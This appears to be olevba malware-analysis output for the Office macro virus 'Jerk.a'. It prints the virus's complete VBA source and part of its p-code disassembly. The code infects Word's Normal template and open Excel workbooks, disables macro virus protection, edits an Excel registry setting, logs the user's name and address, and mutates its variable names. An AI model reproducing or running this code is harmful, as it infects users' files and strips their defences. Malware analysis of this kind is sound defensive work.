olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()

On Error Resume Next

Const One = 1, Truex = True, Falsex = False, Zero = 0

Dim OurCode, ThaClass As String
Dim CounterI, CounterJ As Integer
Dim SaveDocument As Boolean

ThaClass = "ThisWorkbook"

OurCode = Application.ThisWorkbook.VBProject.VBComponents.Item(One).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(One).CodeModule.CountOfLines)

Call InfectWord(OurCode)

For CounterI = One To Application.Workbooks.Count
  
  SaveDocument = Falsex
  
  For CounterJ = One To Application.Workbooks.Item(CounterI).VBProject.VBComponents.Count
  
    If Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.CountOfLines = Zero Then
   
      If Application.Workbooks.Item(CounterI).Path <> "" And Application.Workbooks.Item(CounterI).Saved = Truex And SaveDocument = Falsex Then SaveDocument = Truex
   
      Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.InsertLines One, OurCode
      
      If Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).Name = ThaClass Then
        Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.ReplaceLine One * 33, "Private Sub Workbook_Deactivate()"
      Else
        Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.ReplaceLine One * 33, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next CounterJ
  
  If SaveDocument = Truex Then Application.Workbooks.Item(CounterI).Save

Next CounterI

End Sub

Private Sub Document_Close()

On Error Resume Next

Const Truex = True, Falsex = False, Zero = 0, One = 1, wdFormatDocumentx = wdFormatDocument, wdFormatTemplatex = wdFormatTemplate, DoubleDot = ":"

Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim activedoc, normaltmp As Object
Dim ActiveDocName, OurCode As String

If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"

Set activedoc = ActiveDocument.VBProject.VBComponents.Item(One)
Set normaltmp = NormalTemplate.VBProject.VBComponents.Item(One)

Randomize

DocumentInfected = Falsex
NormalTemplateInfected = Falsex

If activedoc.CodeModule.CountOfLines <> Zero Then DocumentInfected = Truex
If normaltmp.CodeModule.CountOfLines <> Zero Then NormalTemplateInfected = Truex

Options.VirusProtection = Falsex

If (DocumentInfected = Truex Xor NormalTemplateInfected = Truex) And (ActiveDocument.SaveFormat = wdFormatDocumentx Or ActiveDocument.SaveFormat = wdFormatTemplatex) Then
   
  If DocumentInfected = Truex Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = activedoc.CodeModule.Lines(One, activedoc.CodeModule.CountOfLines)
    
    Call AppendLog(OurCode)
    If Int(Rnd * 10 * One) = One * 7 Then Call PolyIt(OurCode)
    Call InfectExcel(OurCode)

    normaltmp.CodeModule.InsertLines One, OurCode
    
    If SaveNormalTemplate = Truex Then NormalTemplate.Save
    
  End If


  ActiveDocName = Mid(ActiveDocument.FullName, 2, One)
  If NormalTemplateInfected = Truex And (ActiveDocName = DoubleDot Or ActiveDocument.Saved = Falsex) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = normaltmp.CodeModule.Lines(One, normaltmp.CodeModule.CountOfLines)
    
    Call InfectExcel(OurCode)
    
    activedoc.CodeModule.InsertLines One, OurCode
    
    If SaveDocument = Truex Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub


Private Sub PolyIt(ByRef OurCode As String)

On Error Resume Next

Const VarCount = 48, UpperLimit = 15, LowerLimit = 5, AsciiA = 65, AsciiZ = 90, One = 1, Truex = True, Falsex = False

Dim AllVariables, VariableTmp, NewCode, Variable(One To VarCount), Variable2(One To VarCount) As String
Dim CounterI, CounterJ, CounterK As Integer
Dim Changed As Boolean

AllVariables = "OurCode VarCount Variable Variable2 NewCode CounterI CounterJ CounterK Changed PolyIt UpperLimit LowerLimit AsciiA AsciiZ One AllVariables VariableTmp SaveDocument SaveNormalTemplate DocumentInfected NormalTemplateInfected activedoc normaltmp AppendLog UserAddy Chr13 Chr10 Comment UserAddyTmp UserNameTmp TimeDate ActiveDocName Truex Falsex Zero wdFormatDocumentx wdFormatTemplatex TimeFormat DateFormat DoubleDot objExcel objWord ThaClass InfectWord InfectExcel RegKey RegOptions Set1"

Randomize

CounterJ = One
For CounterI = One To Len(AllVariables)
  If Mid(AllVariables, CounterI, One) = " " Or CounterI = Len(AllVariables) Then
    
    If CounterI = Len(AllVariables) Then VariableTmp = VariableTmp & Mid(AllVariables, CounterI, One)
    
    For CounterK = One To Int((UpperLimit - LowerLimit + One) * Rnd + LowerLimit)
      Variable2(CounterJ) = Variable2(CounterJ) & Chr(Int((AsciiZ - AsciiA + One) * Rnd + AsciiA))
    Next CounterK
    
    Variable(CounterJ) = VariableTmp
    VariableTmp = ""
    CounterJ = CounterJ + One
  Else
    VariableTmp = VariableTmp & Mid(AllVariables, CounterI, One)
  End If
Next CounterI

Changed = Falsex
For CounterI = One To Len(OurCode)

  For CounterJ = One To VarCount
  
    If Mid(OurCode, CounterI, Len(Variable(CounterJ))) = Variable(CounterJ) Then
      NewCode = NewCode & Variable2(CounterJ)
      CounterI = CounterI + Len(Variable(CounterJ)) - One
      Changed = Truex
      Exit For
    End If
    
  Next CounterJ
  
  If Changed = Falsex Then
    NewCode = NewCode & Mid(OurCode, CounterI, One)
  Else
    Changed = Falsex
  End If
  
Next CounterI

OurCode = NewCode

End Sub


Private Sub AppendLog(ByRef OurCode As String)

On Error Resume Next

Const Comment = "' ", One = 1
Const TimeFormat = "hh:mm:ss: AMPM - ", DateFormat = "dddd, d mmm yyyy"

Dim UserAddyTmp, UserAddy, UserNameTmp, TimeDate, Chr13, Chr10 As String
Dim CounterI As Integer

    Chr13 = Chr(10 * One + 3)
    UserAddy = Application.UserAddress
    TimeDate = Format(Time, TimeFormat) & Format(Date, DateFormat)
    Chr10 = Chr(One * 10)
    UserNameTmp = Application.UserName
    
    For CounterI = One To Len(UserAddy)
      If Mid(UserAddy, CounterI, One) <> Chr13 Then
        If Mid(UserAddy, CounterI, One) <> Chr10 Then
          UserAddyTmp = UserAddyTmp & Mid(UserAddy, CounterI, One)
        End If
      Else
        UserAddyTmp = UserAddyTmp & Chr13 & Comment
      End If
    Next CounterI

    OurCode = OurCode & Chr13 & Comment & TimeDate & Chr13 & Comment & UserNameTmp & Chr13 & Comment & UserAddy & Chr13
End Sub

Private Sub InfectExcel(ByVal OurCode As String)

On Error Resume Next

Dim Set1 As Long
Dim objExcel As Object
Dim RegKey, RegOptions As String

RegKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Set1 = &H0
RegOptions = "Options6"

System.PrivateProfileString("", RegKey, RegOptions) = Set1

Set objExcel = GetObject(, "Excel.Application")

Const One = 1, Zero = 0

Dim ThaClass As String
Dim CounterI, CounterJ As Integer

ThaClass = "ThisWorkbook"

For CounterI = One To objExcel.Application.Workbooks.Count
  
  For CounterJ = One To objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Count
  
    If objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.CountOfLines = Zero Then
    
      objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.InsertLines One, OurCode
      
      If objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).Name = ThaClass Then
        objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.ReplaceLine 33 * One, "Private Sub Workbook_Deactivate()"
      Else
        objExcel.Application.Workbooks.Item(CounterI).VBProject.VBComponents.Item(CounterJ).CodeModule.ReplaceLine One * 33, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next CounterJ
  
Next CounterI


Set objExcel = Nothing

End Sub


Private Sub InfectWord(ByVal OurCode As String)

On Error Resume Next

Const Truex = True, Falsex = False, One = 1, Zero = 0
Dim objWord As Object
Dim SaveNormalTemplate As Boolean

Set objWord = GetObject(, "Word.Application")

If objWord.NormalTemplate.VBProject.VBComponents.Item(One).CodeModule.CountOfLines = Zero Then
  SaveNormalTemplate = objWord.NormalTemplate.Saved
  objWord.Options.VirusProtection = Falsex
  objWord.NormalTemplate.VBProject.VBComponents.Item(One).CodeModule.InsertLines One, OurCode
  If SaveNormalTemplate = Truex Then objWord.NormalTemplate.Save
End If

Set objWord = Nothing

End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Jerk.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15159 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #33:
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' Line #36:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	VarDefn One
' 	LitVarSpecial (True)
' 	VarDefn Truex
' 	LitVarSpecial (False)
' 	VarDefn Falsex
' 	LitDI2 0x0000 
' 	VarDefn Zero
' Line #37:
' Line #38:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn ThaClass (As String)
' Line #39:
' 	Dim 
' 	VarDefn CounterI
' 	VarDefn CounterJ (As Integer)
' Line #40:
' 	Dim 
' 	VarDefn SaveDocument (As Boolean)
' Line #41:
' Line #42:
' 	LitStr 0x000C "ThisWorkbook"
' 	St ThaClass 
' Line #43:
' Line #44:
' 	LitDI2 0x0001 
' 	Ld One 
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld One 
' 	Ld Application 
' 	MemLd ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #45:
' Line #46:
' 	Ld OurCode 
' 	ArgsCall (Call) InfectWord 0x0001 
' Line #47:
' Line #48:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	Ld One 
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #49:
' Line #50:
' 	Ld Falsex 
' 	St SaveDocument 
' Line #51:
' Line #52:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	Ld One 
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #53:
' Line #54:
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Zero 
' 	Eq 
' 	IfBlock 
' Line #55:
' Line #56:
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Ld Truex 
' 	Eq 
' 	And 
' 	Ld SaveDocument 
' 	Ld Falsex 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Truex 
' 	St SaveDocument 
' 	EndIf 
' Line #57:
' Line #58:
' 	Ld One 
' 	Ld OurCode 
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #59:
' Line #60:
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	Ld ThaClass 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld One 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0021 "Private Sub Workbook_Deactivate()"
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #62:
' 	ElseBlock 
' Line #63:
' 	Ld One 
' 	LitDI2 0x0021 
' 	Mul 
' 	LitStr 0x0022 "Private Sub Worksheet_Deactivate()"
' 	Ld CounterJ 
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #64:
' 	EndIfBlock 
' Line #65:
' Line #66:
' 	EndIfBlock 
' Line #67:
' Line #68:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' Line #70:
' 	Ld SaveDocument 
' 	Ld Truex 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CounterI 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #71:
' Line #72:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' Line #74:
' 	EndSub 
' Line #75:
' Line #76:
' 	FuncDefn (Private Sub Document_Close())
' Line #77:
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' Line #80:
' 	Dim (Const) 
' 	LitVarSpecial (True)
' 	VarDefn Truex
' 	LitVarSpecial (False)
' 	VarDefn Falsex
' 	LitDI2 0x0000 
' 	VarDefn Zero
' 	LitDI2 0x0001 
' 	VarDefn One
' 	Ld wdFormatDocument 
' 	VarDefn wdFormatDocumentx
' 	Ld wdFormatTemplate 
' 	VarDefn wdFormatTemplatex
' 	LitStr 0x0001 ":"
' 	VarDefn DoubleDot
' Line #81:
' Line #82:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #83:
' 	Dim 
' 	VarDefn activedoc
' 	VarDefn normaltmp (As Object)
' Line #84:
' 	Dim 
' 	VarDefn ActiveDocName
' 	VarDefn OurCode (As String)
' Line #85:
' Line #86:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "I think "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0016 " is a big stupid jerk!"
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x000B "Class.Poppy"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #87:
' Line #88:
' 	SetStmt 
' 	Ld One 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set activedoc 
' Line #89:
' 	SetStmt 
' 	Ld One 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set normaltmp 
' Line #90:
' Line #91:
' 	ArgsCall Read 0x0000 
' Line #92:
' Line #93:
' 	Ld Falsex 
' 	St DocumentInfected 
' Line #94:
' 	Ld Falsex 
' 	St NormalTemplateInfected 
' Line #95:
' Line #96:
' 	Ld activedoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Zero 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Truex 
' 	St DocumentInfected 
' 	EndIf 
' Line #97:
' 	Ld normaltmp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld Zero 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Truex 
' 	St NormalTemplateInfected 
' 	EndIf 
' Line #98:
' Line #99:
' 	Ld Falsex 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #100:
' Line #101:
' 	Ld DocumentInfected 
' 	Ld Truex 
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	Ld Truex 
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocumentx 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplatex 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #102:
' Line #103:
' 	Ld DocumentInfected 
' 	Ld Truex 
' 	Eq 
' 	IfBlock 
' Line #104:
' Line #105:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #106:
' Line #107:
' 	Ld One 
' 	Ld activedoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld activedoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #108:
' Line #109:
' 	Ld OurCode 
' 	ArgsCall (Call) AppendLog 0x0001 
' Line #110:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	Ld One 
' 	Mul 
' 	FnInt 
' 	Ld One 
' 	LitDI2 0x0007 
' 	Mul 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld OurCode 
' 	ArgsCall (Call) PolyIt 0x0001 
' 	EndIf 
' Line #111:
' 	Ld OurCode 
' 	ArgsCall (Call) InfectExcel 0x0001 
' Line #112:
' Line #113:
' 	Ld One 
' 	Ld OurCode 
' 	Ld normaltmp 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #114:
' Line #115:
' 	Ld SaveNormalTemplate 
' 	Ld Truex 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #116:
' Line #117:
' 	EndIfBlock 
' Line #118:
' Line #119:
' Line #120:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	St ActiveDocName 
' Line #121:
' 	Ld NormalTemplateInfected 
' 	Ld Truex 
' 	Eq 
' 	Ld ActiveDocName 
' 	Ld DoubleDot 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld Falsex 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #122:
' Line #123:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #124:
' Line #125:
' 	Ld One 
' 	Ld normaltmp 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld normaltmp 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #126:
' Line #127:
' 	Ld OurCode 
' 	ArgsCall (Call) InfectExcel 0x0001 
' Line #128:
' Line #129:
' 	Ld One 
' 	Ld OurCode 
' 	Ld activedoc 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #130:
' Line #131:
' 	Ld SaveDocument 
' 	Ld Truex 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #132:
' Line #133:
' 	EndIfBlock 
' Line #134:
' Line #135:
' Line #136:
' 	EndIfBlock 
' Line #137:
' Line #138:
' 	EndSub 
' Line #139:
' Line #140:
' Line #141:
' 	FuncDefn (Private Sub PolyIt(ByRef OurCode As String))
' Line #142:
' Line #143:
' 	OnError (Resume Next) 
' Line #144:
' Line #145:
' 	Dim (Const) 
' 	LitDI2 0x0030 
' 	VarDefn VarCount
' 	LitDI2 0x000F 
' 	VarDefn UpperLimit
' 	LitDI2 0x0005 
' 	VarDefn LowerLimit
' 	LitDI2 0x0041 
' 	VarDefn AsciiA
' 	LitDI2 0x005A 
' 	VarDefn AsciiZ
' 	LitDI2 0x0001 
' 	VarDefn One
' 	LitVarSpecial (True)
' 	VarDefn Truex
' 	LitVarSpecial (False)
' 	VarDefn Falsex
' Line #146:
' Line #147:
' 	Dim 
' 	VarDefn AllVariables
' 	VarDefn VariableTmp
' 	VarDefn NewCode
' 	Ld One 
' 	Ld VarCount 
' 	VarDefn Variable
' 	Ld One 
' 	Ld VarCount 
' 	VarDefn Variable2 (As String)
' Line #148:
' 	Dim 
' 	VarDefn CounterI
' 	VarDefn CounterJ
' 	VarDefn CounterK (As Integer)
' Line #149:
' 	Dim 
' 	VarDefn Changed (As Boolean)
' Line #150:
' Line #151:
' 	LitStr 0x01E6 "OurCode VarCount Variable Variable2 NewCode CounterI CounterJ CounterK Changed PolyIt UpperLimit LowerLimit AsciiA AsciiZ One AllVariables VariableTmp SaveDocument SaveNormalTemplate DocumentInfected NormalTemplateInfected activedoc normaltmp AppendLog UserAddy Chr13 Chr10 Comment UserAddyTmp UserNameTmp TimeDate ActiveDocName Truex Falsex Zero wdFormatDocumentx wdFormatTemplatex TimeFormat DateFormat DoubleDot objExcel objWord ThaClass InfectWord InfectExcel RegKey RegOptions Set1"
' 	St AllVariables 
' Line #152:
' Line #153:
' 	ArgsCall Read 0x0000 
' Line #154:
' Line #155:
' 	Ld One 
' 	St CounterJ 
' Line #156:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	Ld One 
' 	Ld AllVariables 
' 	FnLen 
' 	For 
' Line #157:
' 	Ld AllVariables 
' 	Ld CounterI 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Ld CounterI 
' 	Ld AllVariables 
' 	FnLen 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #158:
' Line #159:
' 	Ld CounterI 
' 	Ld AllVariables 
' 	FnLen 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VariableTmp 
' 	Ld AllVariables 
' 	Ld CounterI 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St VariableTmp 
' 	EndIf 
' Line #160:
' Line #161:
' 	StartForVariable 
' 	Ld CounterK 
' 	EndForVariable 
' 	Ld One 
' 	Ld UpperLimit 
' 	Ld LowerLimit 
' 	Sub 
' 	Ld One 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld LowerLimit 
' 	Add 
' 	FnInt 
' 	For 
' Line #162:
' 	Ld CounterJ 
' 	ArgsLd Variable2 0x0001 
' 	Ld AsciiZ 
' 	Ld AsciiA 
' 	Sub 
' 	Ld One 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	Ld AsciiA 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld CounterJ 
' 	ArgsSt Variable2 0x0001 
' Line #163:
' 	StartForVariable 
' 	Ld CounterK 
' 	EndForVariable 
' 	NextVar 
' Line #164:
' Line #165:
' 	Ld VariableTmp 
' 	Ld CounterJ 
' 	ArgsSt Variable 0x0001 
' Line #166:
' 	LitStr 0x0000 ""
' 	St VariableTmp 
' Line #167:
' 	Ld CounterJ 
' 	Ld One 
' 	Add 
' 	St CounterJ 
' Line #168:
' 	ElseBlock 
' Line #169:
' 	Ld VariableTmp 
' 	Ld AllVariables 
' 	Ld CounterI 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St VariableTmp 
' Line #170:
' 	EndIfBlock 
' Line #171:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	NextVar 
' Line #172:
' Line #173:
' 	Ld Falsex 
' 	St Changed 
' Line #174:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	Ld One 
' 	Ld OurCode 
' 	FnLen 
' 	For 
' Line #175:
' Line #176:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	Ld One 
' 	Ld VarCount 
' 	For 
' Line #177:
' Line #178:
' 	Ld OurCode 
' 	Ld CounterI 
' 	Ld CounterJ 
' 	ArgsLd Variable 0x0001 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Ld CounterJ 
' 	ArgsLd Variable 0x0001 
' 	Eq 
' 	IfBlock 
' Line #179:
' 	Ld NewCode 
' 	Ld CounterJ 
' 	ArgsLd Variable2 0x0001 
' 	Concat 
' 	St NewCode 
' Line #180:
' 	Ld CounterI 
' 	Ld CounterJ 
' 	ArgsLd Variable 0x0001 
' 	FnLen 
' 	Add 
' 	Ld One 
' 	Sub 
' 	St CounterI 
' Line #181:
' 	Ld Truex 
' 	St Changed 
' Line #182:
' 	ExitFor 
' Line #183:
' 	EndIfBlock 
' Line #184:
' Line #185:
' 	StartForVariable 
' 	Ld CounterJ 
' 	EndForVariable 
' 	NextVar 
' Line #186:
' Line #187:
' 	Ld Changed 
' 	Ld Falsex 
' 	Eq 
' 	IfBlock 
' Line #188:
' 	Ld NewCode 
' 	Ld OurCode 
' 	Ld CounterI 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St NewCode 
' Line #189:
' 	ElseBlock 
' Line #190:
' 	Ld Falsex 
' 	St Changed 
' Line #191:
' 	EndIfBlock 
' Line #192:
' Line #193:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	NextVar 
' Line #194:
' Line #195:
' 	Ld NewCode 
' 	St OurCode 
' Line #196:
' Line #197:
' 	EndSub 
' Line #198:
' Line #199:
' Line #200:
' 	FuncDefn (Private Sub AppendLog(ByRef OurCode As String))
' Line #201:
' Line #202:
' 	OnError (Resume Next) 
' Line #203:
' Line #204:
' 	Dim (Const) 
' 	LitStr 0x0002 "' "
' 	VarDefn Comment
' 	LitDI2 0x0001 
' 	VarDefn One
' Line #205:
' 	Dim (Const) 
' 	LitStr 0x0011 "hh:mm:ss: AMPM - "
' 	VarDefn TimeFormat
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	VarDefn DateFormat
' Line #206:
' Line #207:
' 	Dim 
' 	VarDefn UserAddyTmp
' 	VarDefn UserAddy
' 	VarDefn UserNameTmp
' 	VarDefn TimeDate
' 	VarDefn Chr13
' 	VarDefn Chr10 (As String)
' Line #208:
' 	Dim 
' 	VarDefn CounterI (As Integer)
' Line #209:
' Line #210:
' 	LitDI2 0x000A 
' 	Ld One 
' 	Mul 
' 	LitDI2 0x0003 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	St Chr13 
' Line #211:
' 	Ld Application 
' 	MemLd UserAddress 
' 	St UserAddy 
' Line #212:
' 	Ld Time 
' 	Ld TimeFormat 
' 	ArgsLd Format$ 0x0002 
' 	Ld Date 
' 	Ld DateFormat 
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	St TimeDate 
' Line #213:
' 	Ld One 
' 	LitDI2 0x000A 
' 	Mul 
' 	ArgsLd Chr 0x0001 
' 	St Chr10 
' Line #214:
' 	Ld Application 
' 	MemLd UserName 
' 	St UserNameTmp 
' Line #215:
' Line #216:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	Ld One 
' 	Ld UserAddy 
' 	FnLen 
' 	For 
' Line #217:
' 	Ld UserAddy 
' 	Ld CounterI 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Chr13 
' 	Ne 
' 	IfBlock 
' Line #218:
' 	Ld UserAddy 
' 	Ld CounterI 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	Ld Chr10 
' 	Ne 
' 	IfBlock 
' Line #219:
' 	Ld UserAddyTmp 
' 	Ld UserAddy 
' 	Ld CounterI 
' 	Ld One 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddyTmp 
' Line #220:
' 	EndIfBlock 
' Line #221:
' 	ElseBlock 
' Line #222:
' 	Ld UserAddyTmp 
' 	Ld Chr13 
' 	Concat 
' 	Ld Comment 
' 	Concat 
' 	St UserAddyTmp 
' Line #223:
' 	EndIfBlock 
' Line #224:
' 	StartForVariable 
' 	Ld CounterI 
' 	EndForVariable 
' 	NextVar 
